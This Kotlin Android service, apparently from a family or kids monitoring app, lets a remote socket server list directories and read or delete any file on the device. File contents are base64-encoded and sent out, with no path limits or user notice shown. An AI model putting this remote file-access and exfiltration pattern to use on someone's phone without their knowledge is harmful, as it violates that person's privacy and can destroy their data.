package com.xixfamily.kids.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Base64
import android.util.Log
import com.xixfamily.kids.network.SocketManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File

class FileManagerService : Service() {

    companion object { private const val TAG = "FileManager" }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "LIST" -> {
                val path = intent.getStringExtra("path") ?: "/"
                Thread { listDirectory(path) }.start()
            }
            "READ" -> {
                val filePath = intent.getStringExtra("filePath") ?: ""
                Thread { readFile(filePath) }.start()
            }
            "DELETE" -> {
                val filePath = intent.getStringExtra("filePath") ?: ""
                Thread { deleteFile(filePath) }.start()
            }
        }
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?) = null

    private fun listDirectory(path: String) {
        try {
            val dir = File(path)
            val filesArray = JSONArray()

            if (dir.exists() && dir.isDirectory) {
                val entries = dir.listFiles() ?: arrayOf()

                // Sort: directories first, then files, alphabetical
                val sorted = entries.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))

                for (file in sorted) {
                    if (!file.name.startsWith(".")) { // Skip hidden files
                        filesArray.put(JSONObject().apply {
                            put("name", file.name)
                            put("path", file.absolutePath)
                            put("isDirectory", file.isDirectory)
                            put("isFile", file.isFile)
                            put("size", file.length())
                            put("lastModified", file.lastModified())
                            put("permissions", if (file.canRead()) "r" else "-" + 
                                if (file.canWrite()) "w" else "-")
                        })
                    }
                }
            }

            if (SocketManager.getInstance().isSocketConnected()) {
                SocketManager.getInstance().emit("file:list:result", JSONObject().apply {
                    put("path", path)
                    put("files", filesArray)
                })
            }
            Log.d(TAG, "Listed ${filesArray.length()} files in $path")
        } catch (e: Exception) {
            Log.e(TAG, "Error listing directory: ${e.message}")
            SocketManager.getInstance().emit("file:list:result", JSONObject().apply {
                put("path", path)
                put("files", JSONArray())
            })
        }
        stopSelf()
    }

    private fun readFile(filePath: String) {
        try {
            val file = File(filePath)
            if (!file.exists() || !file.isFile) {
                Log.e(TAG, "File not found: $filePath")
                stopSelf()
                return
            }

            val fis = java.io.FileInputStream(file)
            val baos = ByteArrayOutputStream()
            val buffer = ByteArray(8192)
            var bytesRead: Int

            while (fis.read(buffer).also { bytesRead = it } != -1) {
                baos.write(buffer, 0, bytesRead)
            }
            fis.close()

            val fileBase64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            baos.close()

            val mimeType = java.net.URLConnection.guessContentTypeFromName(file.name)
                ?: "application/octet-stream"

            if (SocketManager.getInstance().isSocketConnected()) {
                SocketManager.getInstance().emit("file:read:result", JSONObject().apply {
                    put("filePath", filePath)
                    put("fileName", file.name)
                    put("fileBase64", fileBase64)
                    put("mimeType", mimeType)
                    put("fileSize", file.length())
                })
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading file: ${e.message}")
        }
        stopSelf()
    }

    private fun deleteFile(filePath: String) {
        try {
            val file = File(filePath)
            val success = file.exists() && file.delete()

            if (SocketManager.getInstance().isSocketConnected()) {
                SocketManager.getInstance().emit("file:delete:result", JSONObject().apply {
                    put("filePath", filePath)
                    put("success", success)
                    put("error", if (success) "" else "Failed to delete")
                })
            }
        } catch (e: Exception) {
            SocketManager.getInstance().emit("file:delete:result", JSONObject().apply {
                put("filePath", filePath)
                put("success", false)
                put("error", e.message ?: "Unknown error")
            })
        }
        stopSelf()
    }
}
